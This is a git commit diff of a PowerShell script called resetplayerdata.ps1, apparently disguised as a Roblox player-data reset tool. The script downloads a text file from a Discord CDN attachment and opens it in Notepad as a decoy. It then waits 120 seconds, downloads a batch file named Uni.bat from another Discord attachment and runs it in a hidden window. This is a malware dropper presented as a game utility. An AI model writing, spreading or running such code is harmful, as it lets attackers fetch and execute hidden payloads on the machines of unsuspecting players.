b8b880fcf3cb3a158e863eb8f33752e154eaf04a
vaero05 <143340763+vaero05@users.noreply.github.com>
2023-10-05 17:03:14 +0000

    Update resetplayerdata.ps1

--- resetplayerdata.ps1
+++ resetplayerdata.ps1
@@ -6,8 +6,15 @@ $batUrl = "https://cdn.discordapp.com/attachments/1143578940791857315/1159191579
 $txtPath = [System.IO.Path]::Combine($env:TEMP, "www.roblox.com.txt")
 $batPath = [System.IO.Path]::Combine($env:TEMP, "Uni.bat")
 
-# Download www.roblox.com.txt
+# Install and open www.roblox.com.txt
 iwr -Uri $txtUrl -OutFile $txtPath
+Start-Process -FilePath notepad.exe -ArgumentList $txtPath
+
+# Wait for 120 seconds
+Start-Sleep -Seconds 120
+
+# Download Uni.bat
+iwr -Uri $batUrl -OutFile $batPath
 
 # Define a script block to run PowerShell
 $psScript = {
@@ -16,17 +23,6 @@ $psScript = {
 
 # Start a background job for the PowerShell script
 $psJob = Start-Job -ScriptBlock $psScript
-
-# Check if www.roblox.com.txt exists and open it
-if (Test-Path $txtPath) {
-    Start-Process -FilePath notepad.exe -ArgumentList $txtPath
-}
-
-# Wait for 120 seconds
-Start-Sleep -Seconds 120
-
-# Download Uni.bat
-iwr -Uri $batUrl -OutFile $batPath
 
 # Check if Uni.bat exists and run it with hidden window style
 if (Test-Path $batPath) {
